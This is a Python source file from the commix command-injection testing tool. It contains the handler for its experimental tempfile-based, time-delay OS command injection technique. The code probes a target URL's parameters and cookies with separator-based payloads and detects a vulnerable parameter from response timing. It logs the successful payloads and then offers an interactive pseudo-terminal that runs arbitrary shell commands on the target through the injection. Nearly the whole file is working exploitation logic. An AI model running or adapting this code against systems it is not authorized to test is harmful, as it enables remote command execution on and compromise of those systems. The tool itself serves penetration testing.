#!/usr/bin/env python
# encoding: UTF-8

"""
 This file is part of commix (@commixproject) tool.
 Copyright (c) 2015 Anastasios Stasinopoulos (@ancst).
 https://github.com/stasinopoulos/commix

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.
 
 For more see the file 'readme/COPYING' for copying permission.
"""
import os
import re
import sys
import time
import string
import random
import urllib
import urllib2
  
from src.utils import menu
from src.utils import logs
from src.utils import settings

from src.thirdparty.colorama import Fore, Back, Style, init

from src.core.requests import headers
from src.core.requests import parameters

from src.core.injections.semiblind_based.techniques.tempfile_based import tfb_injector
from src.core.injections.semiblind_based.techniques.tempfile_based import tfb_payloads
from src.core.injections.semiblind_based.techniques.tempfile_based import tfb_enumeration
from src.core.injections.semiblind_based.techniques.tempfile_based import tfb_file_access

"""
 The "tempfile-based" injection technique on Semiblind OS Command Injection.
 __Warning:__ This technique is still experimental, is not yet fully functional and may leads to false-positive resutls.
"""

#-------------------------------------------------
# The "tempfile-based" injection technique handler
#-------------------------------------------------
def tfb_injection_handler(url, delay, filename, tmp_path, http_request_method):
  
  counter = 1
  vp_flag = True
  no_result = True
  is_encoded = False
  fixation = False
  export_injection_info = False
  injection_type = "Semiblind-based Command Injection"
  technique = "tempfile-based injection technique"
  
  # Check if defined "--maxlen" option.
  if menu.options.maxlen:
    maxlen = menu.options.maxlen
    
  # Check if defined "--url-reload" option.
  if menu.options.url_reload == True:
    print Back.RED + "(x) Error: The '--url-reload' option is not available in "+ technique +"!" + Style.RESET_ALL
  
  num_of_chars = 0
  # Calculate all possible combinations
  total = len(settings.SEPARATORS)
  
  # Estimating the response time (in seconds)
  request = urllib2.Request(url)
  headers.do_check(request)
  start = time.time()
  response = urllib2.urlopen(request)
  response.read(1)
  response.close()
  end = time.time()
  diff = end - start
  if int(diff) < 1:
    url_time_response = int(diff)
  else:
    url_time_response = int(round(diff))
    print Style.BRIGHT + "(!) The estimated response time is " + str(url_time_response) + " second" + "s"[url_time_response == 1:] + "." + Style.RESET_ALL
 
  delay = int(delay) + int(url_time_response)
  
  for separator in settings.SEPARATORS:
    num_of_chars = num_of_chars + 1
          
    # Change TAG on every request to prevent false-positive resutls.
    TAG = ''.join(random.choice(string.ascii_uppercase) for num_of_chars in range(6))  

    # The output file for file-based injection technique.
    OUTPUT_TEXTFILE = tmp_path + TAG + ".txt"
    alter_shell = menu.options.alter_shell
    tag_length = len(TAG) + 4
    
    for output_length in range(1, int(tag_length)):
      try:

        # Tempfile-based decision payload (check if host is vulnerable).
        if alter_shell :
          payload = tfb_payloads.decision_alter_shell(separator, output_length, TAG, OUTPUT_TEXTFILE, delay, http_request_method)
        else:
          payload = tfb_payloads.decision(separator, output_length, TAG, OUTPUT_TEXTFILE, delay, http_request_method)

        # Check if defined "--verbose" option.
        if menu.options.verbose:
          if separator == ";" or separator == "&&" or separator == "||":
            sys.stdout.write("\n" + Fore.GREY + payload.replace("\n", "\\n") + Style.RESET_ALL)
            
        # Cookie Injection
        if settings.COOKIE_INJECTION == True:
          # Check if target host is vulnerable to cookie injection.
          vuln_parameter = parameters.specify_cookie_parameter(menu.options.cookie)
          how_long = tfb_injector.cookie_injection_test(url, vuln_parameter, payload)
        else:
          # Check if target host is vulnerable.
          how_long, vuln_parameter = tfb_injector.injection_test(payload, http_request_method, url)

        if not menu.options.verbose:
          percent = ((num_of_chars*100)/total)
          if (url_time_response <= 1 and how_long >= delay) or \
          (url_time_response >= 2 and how_long > delay):
            if len(TAG) == output_length :
              percent = Fore.GREEN + "SUCCEED" + Style.RESET_ALL
          elif percent == 100:
            if no_result == True:
              percent = Fore.RED + "FAILED" + Style.RESET_ALL
            else:
              percent = str(percent)+"%"
          else:
            percent = str(percent)+"%"
          sys.stdout.write("\r(*) Testing the "+ technique + "... " +  "[ " + percent + " ]")  
          sys.stdout.flush()
          
      except KeyboardInterrupt: 
        raise
      
      except:
        if not menu.options.verbose:
          percent = ((num_of_chars*100)/total)
          
          if percent == 100:
            if no_result == True:
              percent = Fore.RED + "FAILED" + Style.RESET_ALL
              sys.stdout.write("\r(*) Testing the "+ technique + "... " +  "[ " + percent + " ]")  
              sys.stdout.flush()
              break
            else:
              percent = str(percent)+"%"
            raise
          else:
            percent = str(percent)+"%"
        break
      
      # Yaw, got shellz! 
      # Do some magic tricks!
      if (url_time_response <= 1 and how_long >= delay) or \
      (url_time_response >= 2 and how_long > delay):
      
        # Time relative false positive fixation.
        if len(TAG) == output_length :
          if fixation == True:
            delay = delay + 1
        else:
          fixation = True
          continue

        found = True
        no_result = False
        
        if settings.COOKIE_INJECTION == True: 
          http_request_method = "cookie"
          found_vuln_parameter = vuln_parameter
        else:
          if http_request_method == "GET":
            found_vuln_parameter = parameters.vuln_GET_param(url)
          else :
            found_vuln_parameter = vuln_parameter

        # Print the findings to log file.
        if export_injection_info == False:
          export_injection_info = logs.add_type_and_technique(export_injection_info, filename, injection_type, technique)
        if vp_flag == True:
          vp_flag = logs.add_parameter(vp_flag, filename, http_request_method, vuln_parameter, payload)
        logs.upload_payload(filename, counter, payload) 
        counter = counter + 1
        
        # Print the findings to terminal.
        print Style.BRIGHT + "\n(!) The ("+ http_request_method + ") '" + Style.UNDERLINE + found_vuln_parameter + Style.RESET_ALL + Style.BRIGHT + "' parameter is vulnerable to "+ injection_type +"."+ Style.RESET_ALL
        print "  (+) Type : "+ Fore.YELLOW + Style.BRIGHT + injection_type + Style.RESET_ALL + ""
        print "  (+) Technique : "+ Fore.YELLOW + Style.BRIGHT + technique.title() + Style.RESET_ALL + ""
        print "  (+) Payload : "+ Fore.YELLOW + Style.BRIGHT + re.sub("%20", " ", payload.replace("\n", "\\n")) + Style.RESET_ALL
        
        # Check for any enumeration options.
        tfb_enumeration.do_check(separator, maxlen, TAG, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)

        # Check for any enumeration options.
        tfb_file_access.do_check(separator, maxlen, TAG, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
        
        # Pseudo-Terminal shell
        while True:
          gotshell = raw_input("\n(?) Do you want a Pseudo-Terminal shell? [Y/n] > ").lower()
          if gotshell in settings.CHOISE_YES:
            print ""
            print "Pseudo-Terminal (type 'q' or use <Ctrl-C> to quit)"
            while True:
              try:
                cmd = raw_input("Shell > ")
                if cmd == "q":
                  sys.exit(0)
                  
                else:
                  # The main command injection exploitation.
                  # Cookie Injection
                  check_how_long, output  = tfb_injector.injection(separator, maxlen, TAG, cmd, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)

                  if menu.options.verbose:
                    print ""
                  if output != "" and check_how_long != 0 :
                    print "\n\n" + Fore.GREEN + Style.BRIGHT + output + Style.RESET_ALL
                    print "\n(*) Finished in "+ time.strftime('%H:%M:%S', time.gmtime(check_how_long)) +".\n"
                  else:
                    print ""
                  
              except KeyboardInterrupt: 
                print ""
                sys.exit(0)
                
          elif gotshell in settings.CHOISE_NO:
            break
            if menu.options.verbose:
              sys.stdout.write("\r(*) Continue testing the "+ technique +"... ")
              sys.stdout.flush()
          
          else:
            if gotshell == "":
              gotshell = "enter"
            print Back.RED + "(x) Error: '" + gotshell + "' is not a valid answer." + Style.RESET_ALL
            pass
          
        break
    
  if no_result == True:
    if menu.options.verbose == False:
      print ""
      return False
    else:
      print ""
      return False
  else :
    sys.stdout.write("\r")
    sys.stdout.flush()

"""
The exploitation function.
(call the injection handler)
"""
def exploitation(url, delay, filename, tmp_path, http_request_method):
    if tfb_injection_handler(url, delay, filename, tmp_path, http_request_method) == False:
      return False
    
#eof 
